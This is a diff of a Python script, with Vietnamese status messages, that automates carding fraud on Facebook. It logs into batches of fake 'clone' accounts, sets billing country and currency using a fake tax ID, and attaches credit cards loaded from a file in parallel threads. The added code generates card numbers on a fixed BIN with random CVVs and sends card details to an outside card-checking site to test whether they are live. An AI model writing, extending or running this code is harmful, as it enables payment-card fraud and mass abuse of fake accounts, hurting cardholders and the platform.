@@ -6,6 +6,7 @@ import random
 
 import requests
 import mechanize
+from random import randint as ri
 
 import threading
 
@@ -191,6 +192,16 @@ def set_country_and_currentcy(cookies,fb_dtsg,account_id):
 	}
 	requests.post(url,data = data, cookies = cookies)
 	print("đổi tiền thành công")
+def set_country_and_currentcy_lol(cookies,fb_dtsg,account_id):
+	url = "https://m.facebook.com/api/graphql/"
+	myID = cookies['c_user']
+	data = {
+		'fb_dtsg': fb_dtsg,
+		'variables': '{"input":{"client_mutation_id":"4","actor_id":"'+myID+'","billable_account_payment_legacy_account_id":"'+account_id+'","currency":"USD","logging_data":{"logging_counter":19,"logging_id":"526291686"},"tax":{"business_address":{"city":"","country_code":"US","state":"","street1":"","street2":"","zip":""},"business_name":"","is_personal_use":false,"tax_id":"1234567891025"},"timezone":"Asia/Jakarta"}}',
+		'doc_id': '5428097817221702'
+	}
+	requests.post(url,data = data, cookies = cookies)
+	print("đổi tiền thành công")
 def list_card():
 	f = open("card.txt","r+")
 	data = f.readlines()
@@ -364,9 +375,10 @@ def auto_add_card(acc,option):
 	sl(3)
 	account_id = get_account_id(cookies)
 	print(account_id)
+	sl(5)
+	set_country_and_currentcy_lol(cookies,fb_dtsg,account_id)
 	sl(3)
-	set_country_and_currentcy(cookies,fb_dtsg,account_id)
-	for i in range(3):
+	for i in range(5):
 		if not check_added_card(cookies,fb_dtsg,account_id):
 			sl(3)
 			card = random.choice(list_card())
@@ -403,7 +415,16 @@ def auto_add_card(acc,option):
 		# change_default_card(cookies,fb_dtsg,account_id)
 	else:
 		print("Thẻ đã chết hoặc clone đã die")
-
+def check_live_card_2(card):
+	url = "https://checker.visatk.com/ccn1/alien07.php"
+	card_val = card.code+"|"+card.date+"|"+card.ccv
+	data = {
+		'ajax': '1',
+		'do': 'check',
+		'cclist': card_val
+	}
+	p = requests.post(url,data=data)
+	print(p.text)
 def login(email,pw,fa):
 	browser = mechanize.Browser()
 	browser.set_handle_robots(False)
@@ -433,7 +454,15 @@ def login(email,pw,fa):
 
 	return str(browser._ua_handlers['_cookies'].cookiejar)
 	
-
+def reg_list_card_2(quantity):
+	list_card_2 = []
+	for i in range(quantity):
+		code = "40165802"+str(ri(12345873,98798786))
+		date = "05|2025"
+		ccv = str(ri(112,989))
+		card = Card(code,date,ccv)
+		list_card_2.append(card)
+	return list_card_2
 
 def getCookie(listCookies):
 	listCookies = listCookies.split("CookieJar")
@@ -449,10 +478,11 @@ def getCookie(listCookies):
 	result = result[0:len(result)-1]
 	return result
 
-option = 2
+option = 1
 arrThread = []
 listClone = listCloneAcc(option)
 list_card_2 = list_card_2()
+# list_card_2 = reg_list_card_2(len(listClone))
 index_list_card_2 = 0
 count_add_list_card_2 = 0
 count = 1
@@ -460,6 +490,5 @@ count_list_clone = len(listClone)
 for acc in listClone:
 	t = threading.Thread(target = auto_add_card,args=(acc,option,))
 	arrThread.append(t)
-	# break
 for t in arrThread:
 	t.start()
